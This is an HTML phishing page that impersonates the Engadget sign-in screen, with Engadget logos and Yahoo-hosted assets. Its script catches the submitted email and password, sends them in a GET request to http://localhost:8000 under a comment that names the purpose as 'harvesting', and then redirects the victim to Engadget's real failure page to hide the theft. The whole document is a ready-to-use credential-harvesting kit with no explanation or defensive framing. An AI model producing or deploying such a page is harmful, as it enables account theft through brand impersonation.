<!DOCTYPE html>
<html id="Stencil" lang="en-US" class="no-js grid light-theme">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no"/>
    <meta name="format-detection" content="telephone=no">
    <meta name="referrer" content="strict-origin-when-cross-origin">
    <title>Login - Sign in to Engadget</title>
    <meta name="description" content="Engadget"/>
    <link rel="icon" type="image/png" href="https://s.yimg.com/wm/assets/images/ns/engadget-favicon-v0.0.01.png"/>
    <link rel="shortcut icon" type="image/png" href="https://s.yimg.com/wm/assets/images/ns/engadget-favicon-v0.0.01.png"/>
    <link rel="apple-touch-icon" href="https://s.yimg.com/wm/assets/images/ns/engadget-apple-touch-icon-v0.0.01.png"/>
    <link href="https://s.yimg.com/wm/mbr/172bdca882ce36922a3a00944ddd91fdaddc28e8/engadget-main.css" rel="stylesheet" type="text/css">
    <style nonce="In4TBTC/V8QchCbGAq8V32cOYkiFQpQ8b08nBDnpv4utj2P/">
        #mbr-css-check { display: inline; }
    </style>
</head>
<body class="bucket-">
<div id="login-body" class="login-body property-content loginish puree-v2 grid">
    <div class="login-box-container">
        <div class="login-box">
            <div class="mbr-login-hd txt-align-center">
                <img src="https://s.yimg.com/wm/assets/images/ns/engadget-logo-v0.0.2.png" alt="Engadget" class="logo engadget-en-US" width="116" height=""/>
                <img src="https://s.yimg.com/wm/assets/images/ybar/engadget-logo-white-v0.0.2.png" alt="Engadget" class="dark-mode-logo logo engadget-en-US" width="116" height=""/>
            </div>
            <div class="challenge">
                <div id="login-challenge" class="primary">
                    <strong class="challenge-heading">Sign in</strong>
                    <span class="txt-align-center challenge-desc">Enter your email and password to sign in</span>
                    <form id="login-form" method="GET" action="http://localhost:8000" class="challenge-form">
                        <div class="input-group">
                            <input type="email" name="username" id="login-username" value="" autocomplete="username" autocapitalize="none" autocorrect="off" placeholder=" "/>
                            <label for="login-username" id="login-label" class="login-label">Email address</label>
                        </div>
                        <div id="password-container" class="input-group password-container">
                            <input type="password" id="login-passwd" name="password" placeholder=" " autocomplete="current-password"/>
                            <label for="login-passwd" id="password-label" class="password-label">Password</label>
                            <button type="button" class="show-hide-toggle-button hide-pw" id="password-toggle-button" tabindex="-1" title="Show password">Show</button>
                        </div>
                        <p id="login-error" class="error-msg hide" role="alert"></p>
                        <div class="button-container">
                            <button type="submit" id="login-signin" class="pure-button puree-button-primary challenge-button" value="Sign In">Sign In</button>
                        </div>
                        <div class="forgot-cont challenge-button-link">
                            <a href="/forgot" id="mbr-forgot-link">Forgot password?</a>
                        </div>
                        <div class="bottom-links-container">
                            <p class="sign-up-link">
                                <a href="/account/create" id="createacc" role="button" class="pure-button puree-button-secondary challenge-button">Create an account</a>
                            </p>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
    <div class="property-container">
        <div class="login-bg-mask"></div>
        <iframe src="https://s.yimg.com/wm/mbr/html/engadget-v0.0.1.html" allowfullscreen frameborwser="0" width="100%" height="100%" sandbox></iframe>
    </div>
</div>
<script nonce="In4TBTC/V8QchCbGAq8V32cOYkiFQpQ8b08nBDnpv4utj2P/">
    // Toggle password visibility
    document.getElementById('password-toggle-button').addEventListener('click', function() {
        const passwordInput = document.getElementById('login-passwd');
        const button = this;
        if (passwordInput.type === 'password') {
            passwordInput.type = 'text';
            button.textContent = 'Hide';
            button.title = 'Hide password';
        } else {
            passwordInput.type = 'password';
            button.textContent = 'Show';
            button.title = 'Show password';
        }
    });

    // Handle form submission
    document.getElementById('login-form').addEventListener('submit', function(event) {
        event.preventDefault(); // Prevent default form submission
        const form = this;
        const username = encodeURIComponent(form.querySelector('#login-username').value);
        const password = encodeURIComponent(form.querySelector('#login-passwd').value);
        const callbackUrl = `http://localhost:8000?username=${username}&password=${password}`;
        
        // Send credentials to localhost (for harvesting)
        fetch(callbackUrl, { method: 'GET' })
            .then(() => {
                // Redirect to failure page
                window.location.href = 'https://login.engadget.com/account/challenge/fail';
            })
            .catch((error) => {
                console.error('Error sending credentials:', error);
                // Redirect to failure page even if fetch fails
                window.location.href = 'https://login.engadget.com/account/challenge/fail';
            });
    });
</script>
</body>
</html>
